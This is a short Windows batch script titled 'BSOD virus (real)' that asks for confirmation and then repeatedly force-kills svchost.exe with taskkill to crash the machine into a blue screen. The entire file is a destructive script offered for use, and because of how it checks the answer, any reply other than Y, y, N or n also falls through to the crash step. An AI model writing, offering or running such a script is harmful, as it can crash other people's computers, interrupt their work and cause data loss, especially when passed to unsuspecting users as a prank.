cls
@echo off
Title BSOD virus (real)
echo Make sure you clicked run as Administrator
echo Are you sure you want to BSOD? (Y/N)
set/p "cho=>"
 if %cho%==Y goto BSOD
 if %cho%==y goto BSOD
 if %cho%==N goto end
 if %cho%==n goto end
:BSOD
 taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
taskkill.exe /f /im svchost.exe
:end